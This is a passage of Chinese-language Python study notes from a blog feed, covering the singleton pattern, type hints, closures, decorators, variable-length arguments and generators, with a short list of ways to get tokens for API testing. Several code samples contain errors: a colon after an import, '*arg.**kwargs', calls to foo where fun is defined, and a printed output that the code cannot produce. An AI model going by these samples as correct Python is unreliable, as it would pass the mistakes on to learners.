class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-string">&quot;Request failed&quot;</span><br><br>  <span class="hljs-comment"># ... 其他测试逻辑</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 那接口自动化的过程中，还有什么其他的方式拿token吗</span><br><span class="hljs-comment"># 在接口自动化过程中，除了使用反射机制外，还有一些其他的方式可以获取 token，具体取决于接口的设计和实际情况。以下是一些常见的获取 token 的方式：</span><br><br><span class="hljs-comment"># 固定 Token： 在开发环境中，可以事先创建一个特定的用户账号，为其生成一个固定的 token，用于接口测试。这样每次测试可以直接使用这个固定的 token。</span><br><br><span class="hljs-comment"># 环境变量： 将 token 存储为环境变量，测试时从环境变量中读取 token 值。这样可以在不同环境中灵活切换和管理 token。</span><br><br><span class="hljs-comment"># 动态生成： 在每次测试运行前，通过自动化脚本执行登录操作，获取实时的 token。登录成功后，从接口响应中提取 token 并存储到变量中，供后续接口请求使用。</span><br><br><span class="hljs-comment"># Token 中心： 在一些复杂的系统中，可能会有专门的 token 中心用于管理用户的身份验证信息。测试时，可以调用 token 中心的接口获取有效的 token。</span><br><br><span class="hljs-comment"># JWT（JSON Web Token）： 如果接口使用了 JWT 进行身份验证，可以根据 JWT 的生成规则生成合法的 token。这需要了解 JWT 的具体生成方式。</span><br></code></pre></td></tr></table></figure><h2 id="4-16-单例模式【重点】–设计模式的一种"><a href="#4-16-单例模式【重点】–设计模式的一种" class="headerlink" title="4.16 单例模式【重点】–设计模式的一种"></a>4.16 单例模式【重点】–设计模式的一种</h2><ul><li>首先，单例模式是什么？ 是软件的一种设计模式，</li><li>目的：无论调用多少次产生的实例对象，都是指向同一个内存地址，仅仅只有一个实力（<strong>一个对象</strong>）</li><li>方式： 首先实现单例模式的手段有很多终端鹅，但总的原则是什么，是包装你定义的一个类，只要实例化一个对象，下一次再实例化对象的时候，就直接返回你已经实例化过的这个对象，不再做实例化的操作，<br><strong>所以这里关键的一点就是，你该如何去判断这个类是否已经实例化过一个对象</strong></li><li>这里介绍两类方式：<ul><li>一个是通过<strong>模块导入</strong>的方式；</li><li>二个事通过一个<strong>魔法方法</strong>去判断方式</li></ul></li><li>应用的场景呢？什么时候用单例模式去创建一个类呢？<ul><li><p>网站计数器，确保全局只有一个计数器实例化对象，用来记录网站的总访问次数。</p></li><li><p>**配置管理器：配置信息的管理，确保你整套代码中，只有一个配置管理器的实例，用于统一管理配置信息，比如说同意发送请求，所有的请求都是通过这个实例化对象去访问的，</p><p>**</p></li><li><p><strong>日志记录器：全局代码运行的时候确保只有一个日志记录器的实例化对象，用来记录这套代码运行时的日志记录</strong></p></li><li><p><strong>数据库连接池：保证整套代码运行的过程中，只有一个数据库连接池的实例，方便管理对数据库的同意连接和同意关闭连接池</strong></p></li></ul></li><li>注意一下：单例模式虽然可以在很多特定场景下体统便利，但不可以过度依赖单例模式导致代码的可测试性和可维护性降低</li></ul><p>通过<strong>模块导入</strong>的方式怎么实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># singleton.py</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span>:<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Singleton instance created&quot;</span>)<br><br><br>singleton_instance = Singleton()<br><span class="hljs-comment"># 在singleton.py 文件里面定义了一个类Singleton，</span><br><span class="hljs-comment"># 通过singleton_instance = Singleton()</span><br></code></pre></td></tr></table></figure><p>在另一个文件中导入这个模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> singleton<br><br><span class="hljs-comment"># 创建第一个实例，会输出&quot;Singleton instance created&quot;</span><br>instance1 = singleton.singleton_instance<br><br><span class="hljs-comment"># 创建第二个实例，不会再次输出&quot;Singleton instance created&quot;</span><br>instance2 = singleton.singleton_instance<br><br><span class="hljs-built_in">print</span>(instance1 <span class="hljs-keyword">is</span> instance2)  <span class="hljs-comment"># 输出：True，说明两个实例是同一个实例</span><br><br></code></pre></td></tr></table></figure><p>通过<strong>类绑定方法</strong>的方式来实现单例模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 通过在类方法中控制实例的创建和返回，可以确保在程序中只有一个实例被创建。</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span>:<br>  _instance = <span class="hljs-literal">None</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">if</span> Singleton._instance <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>      <span class="hljs-keyword">raise</span> ValueError(<br>        <span class="hljs-string">&quot;Singleton instance already exists&quot;</span>)  <span class="hljs-comment"># 第二次实例化的时候，_instance不为空 抛出异常，不打印Singleton instance created </span><br>    Singleton._instance = self<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Singleton instance created&quot;</span>)<br><br><span class="hljs-meta">  @classmethod</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_instance</span>(<span class="hljs-params">cls</span>):<br>    <span class="hljs-keyword">if</span> cls._instance <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 第一次实例化的时候，类的_instance为空，走到了上面的方法了，打印Singleton instance created</span><br>      cls._instance = cls()  <span class="hljs-comment"># </span><br>    <span class="hljs-keyword">return</span> cls._instance<br><br><br><span class="hljs-comment"># 创建第一个实例，会输出&quot;Singleton instance created&quot;</span><br>instance1 = Singleton.get_instance()<br><br><span class="hljs-comment"># 创建第二个实例，不会再次输出&quot;Singleton instance created&quot;</span><br>instance2 = Singleton.get_instance()<br><br><span class="hljs-built_in">print</span>(instance1 <span class="hljs-keyword">is</span> instance2)  <span class="hljs-comment"># 输出：True，说明两个实例是同一个实例</span><br><span class="hljs-comment"># 原理：类的绑定方法是第二种实例化对象的方式，</span><br><span class="hljs-comment"># 第一次实例化的对象保存成类的数据属性 _instance，</span><br><span class="hljs-comment"># 第二次再实例化时，在get_singleton中判断已经有了实例对象，直接返回类的数据属性 _instance</span><br></code></pre></td></tr></table></figure><blockquote><p><strong>补充</strong>：这种方式实现的单例模式有一个明显的bug；bug的根源在于如果用户不通过绑定类的方法实例化对象，而是直接通过类名加括号实例化对象，那这样不再是单利模式了。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】进阶之函数详解（三）</title>
    <link href="/2024/03/18/603python%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2024/03/18/603python%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="3-函数"><a href="#3-函数" class="headerlink" title="3 函数"></a>3 函数</h1><h2 id="3-1类型提示"><a href="#3-1类型提示" class="headerlink" title="3.1类型提示"></a>3.1类型提示</h2><ul><li>Python 3.6后加入了新功能：类型提示，用来声明一个变量的类型</li><li>在FastAPI中，类型提示可以用到Swagger文档中</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name_with_age</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span>, age: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-comment"># 基本类型: int、float、bool、bytes</span><br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>: <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_items</span>(<span class="hljs-params">items: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]</span>):  <span class="hljs-comment"># 复杂的类型提示</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-built_in">print</span>(item)<br></code></pre></td></tr></table></figure><h2 id="3-2-函数是一等公民"><a href="#3-2-函数是一等公民" class="headerlink" title="3.2 函数是一等公民"></a>3.2 函数是一等公民</h2><ul><li><p>在编程语言中，一等公民可以作为函数参数，可以作为函数返回值，也可以赋值给变量。</p></li><li><p>python中一切且对象，所以函数也是对象，函数也是一等公民。</p></li><li><p>也就是说函数可以作为函数参数，可以作为函数返回值，也可以赋值给变量。</p></li></ul><p>示例1：函数当变量被赋值引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-built_in">print</span>(x + y)<br>    <br>func = add<span class="hljs-comment"># func</span><br>func(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)<span class="hljs-comment"># 等同于 add(x, y); 类似变量的赋值引用</span><br></code></pre></td></tr></table></figure><p>示例2：函数做容器元素的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-built_in">print</span>(x + y)<br><br>funcs = [add]<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> funcs:<br>    f(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>示例3：函数做实参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> x + <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, func</span>):<br>    <span class="hljs-keyword">return</span> func(x)<br><br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">3</span>, func))    <span class="hljs-comment"># 打印：4</span><br></code></pre></td></tr></table></figure><p>示例4：函数做返回值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> x+y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    <span class="hljs-keyword">return</span> add<br><br><br>func = foo()<span class="hljs-comment"># 相当于 func = add</span><br>func(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)<span class="hljs-comment"># x相当于 add(3, 4)</span><br></code></pre></td></tr></table></figure><h2 id="3-3闭包函数"><a href="#3-3闭包函数" class="headerlink" title="3.3闭包函数"></a>3.3闭包函数</h2><p>前面说了，函数是一等公民，所以函数可以作为入参和返回值传递</p><ul><li>内嵌函数包含对外层函数作用域中变量的引用（非全局作用域的变量，是外层函数内部的变量），那么该内嵌函数就是闭包函数，称为闭包（Closures）</li><li>正常函数内部变量在函数调用之后就会被回收，但是闭包函数的出现，破坏了这个规则，让内部变量可以在函数外部使用</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">outer</span>():<br>    x = <span class="hljs-number">10</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner</span>():<br>        <span class="hljs-keyword">return</span> x + <span class="hljs-number">1</span><span class="hljs-comment"># 此时 inner是闭包函数（引用了外层函数作用域的变量）</span><br>    <span class="hljs-keyword">return</span> inner<br><br><br>x = <span class="hljs-number">10</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">outer</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner</span>():<br>        <span class="hljs-keyword">return</span> x + <span class="hljs-number">1</span><span class="hljs-comment"># 此时，inner不是闭包函数(没有引用外层函数作用域的变量)</span><br>    <span class="hljs-keyword">return</span> inner<br></code></pre></td></tr></table></figure><p>【如何判断闭包函数】</p><ul><li>方法1：是否引用外层函数作用域中的变量</li><li>方法2：通过函数的closure属性，查看到闭包函数所包裹的外部变量。不是闭包该值为None</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">func.__closure__<br>f.__closure__[<span class="hljs-number">0</span>].cell_contents<br></code></pre></td></tr></table></figure><p>【闭包函数的用途】</p><ul><li>为函数体传参。<strong>一次传参，后续使用无须再传参</strong> 。闭包函数的这种特性有时又称为惰性计算。</li><li>装饰器（重要）</li><li>示例2：为函数体传参</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner</span>():<br>        response = requests.get(url)<br>        <span class="hljs-built_in">print</span>(response.text)<br>    <span class="hljs-keyword">return</span> inner<br><br><br>baidu = outer(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<br>baidu()<br>baidu()<br></code></pre></td></tr></table></figure><p>作用：</p><ul><li>1、实现函数工厂：动态地生成和返回具有不同参数的函数</li><li>2、保护数据： 将变量封装在闭包中，限制对变量的直接访问，实现数据的封装和隐藏</li><li>3、装饰器：用于在函数前后执行额外的代码，如性能分析，日志收集等，用于加强函数</li></ul><h2 id="3-4-普通装饰器【有另开一篇】"><a href="#3-4-普通装饰器【有另开一篇】" class="headerlink" title="3.4 普通装饰器【有另开一篇】"></a>3.4 普通装饰器【有另开一篇】</h2><p>目的：在不修改原有函数代码的情况下，增强函数，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 假设要在运行函数的时候，加上日志打印函数的方法：</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">outfun</span>(<span class="hljs-params">fun</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">innerfun</span>(<span class="hljs-params">*args,**kwargs</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前方法的名称是：<span class="hljs-subst">&#123;fun.__name__&#125;</span>&quot;</span>)<br>        re = fun(*args,**kwargs)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前方法的名称是：<span class="hljs-subst">&#123;fun.__name__&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> re<br>    <span class="hljs-keyword">return</span> innerfun<br><br><span class="hljs-meta">@outfun</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">return</span> a+b<br>result = add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 运行的是上面定义的被装饰过后的内嵌函数innerfun</span><br><span class="hljs-built_in">print</span>(result)  <br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-comment"># 当前方法的名称是：add</span><br><span class="hljs-comment"># 当前方法的名称是：add</span><br><span class="hljs-comment"># 3</span><br><span class="hljs-comment"># 加了装饰器语法@outfun之后，当我们运行add()方法的时候，实际上运行的是被装饰过后的函数innerfun</span><br></code></pre></td></tr></table></figure><h2 id="3-5-带参数装饰器"><a href="#3-5-带参数装饰器" class="headerlink" title="3.5 带参数装饰器"></a>3.5 带参数装饰器</h2><p>知道装饰器的原理之后，带参数的装饰器实现就很简单，就是在外层函数的外面，再嵌套一层函数，且最外层函数的入参就是带参装饰器的入参，接上面</p><p>被装饰的函数需要参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 再到外层定义一个最外层函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">overfun</span>(<span class="hljs-params">login</span>):<br><span class="hljs-comment"># 先定义一个装饰器函数</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">outfun</span>(<span class="hljs-params">fun</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">innerfun</span>(<span class="hljs-params">*arg,**kwargs</span>):<br>            <span class="hljs-keyword">if</span> login== <span class="hljs-string">&quot;debug&quot;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;函数的名称是：<span class="hljs-subst">&#123;fun.__name__&#125;</span>,等级是debug&quot;</span>)<br>            result = fun(*arg.**kwargs)<br>            <span class="hljs-keyword">if</span> login==<span class="hljs-string">&quot;info&quot;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;函数的名称是：<span class="hljs-subst">&#123;fun.__name__&#125;</span>,等级是info&quot;</span>)<br>            <span class="hljs-keyword">return</span> result<br>        <span class="hljs-keyword">return</span> innerfun<br>    <span class="hljs-keyword">return</span> outfun<br><br><span class="hljs-meta">@overfun(<span class="hljs-params">login=<span class="hljs-string">&quot;info&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">testadd</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">return</span> a+b<br>r = testadd(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><p>使用装饰器时可以给装饰器传参数</p><p>- </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">flag</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params">func</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params">*args, **kwargs</span>):<br>            start = time.time()<br>            rets = func(*args, **kwargs)<br>            end = time.time()<br>            <span class="hljs-keyword">if</span> flag == <span class="hljs-string">&quot;am&quot;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;func&#125;</span>运行用时(am):<span class="hljs-subst">&#123;end - start&#125;</span>s&#x27;</span>)<br>            <span class="hljs-keyword">elif</span> flag == <span class="hljs-string">&quot;pm&quot;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;func&#125;</span>运行用时(pm):<span class="hljs-subst">&#123;end - start&#125;</span>s&#x27;</span>)<br>            <span class="hljs-keyword">return</span> rets<br><br>        <span class="hljs-keyword">return</span> inner<br>    <span class="hljs-keyword">return</span> outer<br><br><br><span class="hljs-meta">@wrapper(<span class="hljs-params"><span class="hljs-string">&quot;am&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">x, y</span>):<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> x + y<br><br><br><span class="hljs-built_in">print</span>(foo(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure><p>分析：先调用wrapper(“am”)  返回outer，再看@outer，即普通的装饰器，相当于 foo &#x3D; outer(foo)</p><h3 id="3-5-1-装饰器的优缺点和应用场景"><a href="#3-5-1-装饰器的优缺点和应用场景" class="headerlink" title="3.5.1 装饰器的优缺点和应用场景"></a>3.5.1 装饰器的优缺点和应用场景</h3><ul><li><p>优点： 不改变函数代码的前提下，对函数进行增强</p></li><li><p>缺点：无法一眼看清楚代码，有些人看不懂，嵌套比较多</p></li><li><p>应用场景：</p><ul><li>1、<strong>日志记录，无需写login方法就可打印日志</strong></li><li>2、<strong>权限控制，判断入参有没有某个属性，如果没有就无权限</strong></li><li>3、性能优化：</li><li>4、数据验证：在输入输出的数据验证和转换方面，装饰器可以实现输入验证、类型转换</li><li>5、代码计时：记录这段函数代码运行的花费的时间</li></ul></li></ul><h2 id="3-6-可变长参数的高级用法"><a href="#3-6-可变长参数的高级用法" class="headerlink" title="3.6 可变长参数的高级用法"></a>3.6 可变长参数的高级用法</h2><p>首先python是常规函数是严格按照定义的形参传的，如果实参数量大于形参就会报错</p><ul><li>【可边长位置参数】*args 如过在最后一个形参前面加星号，那么在调用函数的时候，溢出的位置实参都会被接收下来，且会以元组的形式保存下来赋值给该形参。这里用 *args</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun</span>(<span class="hljs-params">*args</span>):<br>    <span class="hljs-built_in">print</span>(*args)<br>foo(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>)<br><span class="hljs-comment"># output:</span><br><span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span><br>(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>)<br></code></pre></td></tr></table></figure><ul><li>【可变长关键字参数】如果在最后一个形参前面加两个星号 那么在调用函数的时候，溢出的关键字仍然都会被接收，且会以字典的形式保存下来赋值给该形参，一般用  **kwargs传递</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun</span>(<span class="hljs-params">x,**kwargs</span>):<br>    <span class="hljs-built_in">print</span>(x)<br>    <span class="hljs-built_in">print</span>(kwargs)<br>foo(<span class="hljs-number">1</span>, y=<span class="hljs-number">2</span>, z=<span class="hljs-number">3</span>)<span class="hljs-comment"># 溢出的关键字实参y=2，z=3都被**接收，以字典的形式保存下来，赋值给kwargs</span><br><span class="hljs-comment">#output:</span><br><span class="hljs-number">1</span><br>&#123;<span class="hljs-string">&#x27;z&#x27;</span>:<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;y&#x27;</span>:<span class="hljs-number">2</span>&#125;<br></code></pre></td></tr></table></figure><ul><li>【补充一下 *args的用法】 将可迭代对象的元素打散传入函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-built_in">print</span>(x+y)<br>list1=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]<br>fun(*list1) <span class="hljs-comment"># 这里会将list1列表内的两个元素打散传进函数里面去</span><br></code></pre></td></tr></table></figure><ul><li>【补充一下 **的用法】 可以将字典每个key-value拆开为关键字传参</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-built_in">print</span>(x+y)<br>    <br>nums = &#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-number">2</span>&#125;<br>fun(**nums)<br></code></pre></td></tr></table></figure><h2 id="3-7-yield【重点】"><a href="#3-7-yield【重点】" class="headerlink" title="3.7 yield【重点】"></a>3.7 yield【重点】</h2><ul><li><p>普通函数在被调用的时候，会从上往下依次执行函数代码。遇到return语句时立即退出函数且返回返回值，再次调用这个函数的试试，函数会再次从头到尾执行一遍</p></li><li><p>函数生成器被调用时，也是会从上往下执行代码，遇到yield语句后，再yield位置处挂起并且返回yield后的数据出来。此函数再次被调用的时候，会从挂起位置处（也就是yield处）再往下执行函数</p></li><li><p>【函数生成器】函数体包含yield关键字，就是函数生成器</p></li><li><p>生成器对象，指对象内置有<code>_iter__</code>__和 <code>__nex__</code>t方法，所以生成器本身就是一个迭代器，可以被for循环遍历</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_range</span>(<span class="hljs-params">start,end,step=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">while</span> start&lt; end:<br>        <span class="hljs-keyword">yield</span> start<br>        start+=step<br>g=my_range(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)<br><span 